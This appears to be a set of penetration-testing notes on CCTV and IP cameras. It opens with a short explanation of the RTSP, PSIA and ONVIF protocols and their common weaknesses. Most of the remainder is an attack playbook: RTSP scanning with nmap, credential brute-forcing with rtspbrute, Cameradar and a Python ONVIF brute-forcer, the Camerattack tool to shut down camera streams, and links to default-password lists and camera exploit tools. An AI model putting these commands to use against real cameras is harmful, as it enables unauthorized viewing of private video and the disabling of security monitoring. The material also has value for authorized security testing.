# Protocols used

![[cctv.png]]

> **RTSD** : Application-Layer protocol used for commanding streaming media servers via pause and play capabilities. **Most IP cameras use the Real-Time Streaming Protocol** to establish and control video and audio streams. The content is delivered using **RTP** (Real-time Transport Protocol). RSTP does not provide configuration. That must be done using the URI and IP address. **Most systems support RTSP as a fallback even if they are using a different protocol such as PSIA or ONVIF**. _RTSP as an umbrella term describes the **entire stack of RTP** : RTCP (Real-Time Control Protocol), RTSPS (RTSPS over SSL/Secure RTSP) and RTSP_.

> **PSIA** : PSIA is a global consortium of physical security manufacturers and stakeholders that provides a standard for enabling interoperability between security devices. It covers a wide range of security system aspects, including video and analytics, access control, intrusion detection, and other security systems. The PSIA standard defines APIs for products, enabling them to be compatible with systems from other manufacturers that also adhere to the PSIA standard.

> **ONVIF**: ONVIF is an open industry forum that aims to **standardize the communication between IP-based physical security products**. It focuses on ensuring interoperability between network video devices and promotes a global open standard for the interface of IP-based physical security products. ONVIF covers a range of operations including video streaming, device discovery, PTZ (pan, tilt, zoom) control, and more.

> **In essence, PSIA and ONVIF provide a framework for how various security devices can communicate and work together, while RTSP is specifically about how to stream video and audio between devices. A security camera could support ONVIF or PSIA for configuration and control, and also use RTSP for streaming video data to a client or recorder.**

# Common vulnerabilities

The vulnerabilities of protocols like PSIA, ONVIF, and RTSP often revolve around how they are implemented in devices and how the network is configured. Here are some common vulnerabilities associated with these protocols:

- **Default Credentials:**
	- Many devices come with default administrator credentials which are often not changed by the user. This makes it easy for attackers to gain unauthorized access.
- **Unencrypted Communications:**
	- Some implementations of these protocols do not use encryption, which means that data, including video streams and control commands, can be intercepted and viewed by unauthorized parties.
- **Lack of Authentication and Authorization:**
	- Some devices may not properly implement authentication and authorization checks, allowing unauthenticated users to access streams or control the device.
- **Firmware Vulnerabilities:**
	- Devices may have outdated firmware with known vulnerabilities that can be exploited. Manufacturers might be slow to release patches, or users may neglect to update their devices.
- **Insufficient Network Segmentation:**
	- Devices on the network may not be properly segmented from other parts of the network, increasing the risk of lateral movement by an attacker after compromising a device.
- **Denial of Service (DoS):**
	- Protocols may be susceptible to DoS attacks where an attacker overwhelms the device with requests, causing it to crash or become unresponsive.
- **Injection Flaws:**
	- Poorly implemented protocols may be vulnerable to injection attacks, where an attacker sends malicious commands or queries that are executed by the device.
- **Replay Attacks:**
	- Without proper safeguards like timestamps or tokens, attackers might capture legitimate commands and replay them to gain control of a device.
- **ONVIF-Specific Issues:**
	- Some ONVIF devices have been found to be susceptible to XML External Entity (XXE) attacks, allowing attackers to interfere with the XML parsing process.
- **PSIA-Specific Issues:**
	- PSIA lacks widespread adoption compared to ONVIF, which might mean that security is not as rigorously tested or updated by manufacturers.

---
# Exploit

>"You see, but you do not observe." - S. Holmes

## 🔑 Default Credentials  

- 🔗 [The default passwords of nearly every IP camera (Hackers Arise, 2023)](https://www.hackers-arise.com/post/the-default-passwords-of-nearly-every-ip-camera)  
- 🔗 [Default Camera Passwords (IspyConnect)](https://www.ispyconnect.com/userguide-default-passwords.aspx)  

---
## 📡 RTSP  

### 🔍 Seeking Out  

> **Ports used by RTSP**:  
> - 554  
> - 5554  
> - 8554  
### Make a Request  

```bash
curl -i -X OPTIONS rtsp://$ip/stream1 RTSP/1.1
# A valid RTSP service should respond with: RTSP/1.0 200 OK
````
### Scanning

```bash
nmap -sV --script "rtsp-*" -p $port $ip
```
### Bruteforce

🔗 [Common wordlist](https://github.com/nmap/nmap/blob/master/nselib/data/rtsp-urls.txt)

```bash
pip install rtspbrute av Pillow rich
rtspbrute -t hosts.txt -p 8554
```
### 🛠 Cameradar
>Get All Info + Bruteforce

```bash
git clone https://github.com/Ullaakut/cameradar
cd cameradar

# Scan for default ports
docker run --net=host -t ullaakut/cameradar -t $ip

# Bruteforce
docker run -t ullaakut/cameradar -t $ip -p $port -T 3s -s 3 -d

# With custom wordlist
docker run ullaakut/cameradar -t -v /usr/share/seclists/Passwords/Common-Credentials:/tmp/dictionaries -c "tmp/dictionaries/10-million-password-list-top-1000000.json" -t $ip
```

---
## 🎥 ONVIF

> If you receive long output in XML markup, the device supports the ONVIF protocol. ONVIF does not have a standard port but is usually found on ports **8899, 80, 8080, 5000, 6688**.

**Install:**
```bash
sudo pip install onvif
git clone https://github.com/quatanium/python-onvif.git
cd python-onvif && python setup.py install
```
#### Get the Hostname
```python
from onvif import ONVIFCamera

mycam = ONVIFCamera('192.168.0.2', 80, 'user', 'passwd', '/etc/onvif/wsdl/')

# Get Hostname
resp = mycam.devicemgmt.GetHostname()
print('My camera’s hostname: ' + str(resp.Name))

# Get system date and time
dt = mycam.devicemgmt.GetSystemDateAndTime()
tz = dt.TimeZone
year = dt.UTCDateTime.Date.Year
hour = dt.UTCDateTime.Time.Hour
```

### Bruteforce
```python
import sys
from onvif import ONVIFCamera

if len(sys.argv) < 4:
    user = ''
else:
    user = sys.argv[3]

if len(sys.argv) < 5:
    password = ''
else:
    password = sys.argv[4]

mycam = ONVIFCamera(sys.argv[1], sys.argv[2], user, password, '/usr/local/lib/python3.9/site-packages/wsdl/')
resp = mycam.devicemgmt.GetDeviceInformation()
print(str(resp))
```

**Launch the Bruteforcer:**

```bash
parallel -j2 -a usernames.txt -a passwords.txt 'python3 bruteforcer.py $ip $port 2>/dev/null {1} {2}'
```

---
## ❌ Shut Down CCTV

- 🔗 [Camerattack](https://github.com/Ullaakut/camerattack)

```bash
# Install
export GO111MODULE=on
go get github.com/ullaakut/camerattack@latest
cd $GOPATH/src/github.com/ullaakut/camerattack
go install

# Usage
camerattack rtsp://0.0.0.0:8554/live.sdp
```

---
## 🛠 Tricks That Could Work

> Try to log in with empty passwords **7+ times**

---
## 🔍 Tools

- 🔗 [CamOver - For CCTV, GoAhead, Netwave](https://github.com/EntySec/CamOver)

---
## 📚 Resources

- 📄 [Exploiting Surveillance Cameras like a Hollywood Hacker - Craig Heffner (2013)](https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-WP.pdf)
    > 🔗 Linked Exploit Tool: [IPCamShell](https://github.com/nmalcolm/ipcamshell)
- 🎥 [Hacking CCTV and IP Cameras: Are You Safe? - David Bombai, YouTube (2022)](https://www.youtube.com/watch?v=ZGCScbV7vSA)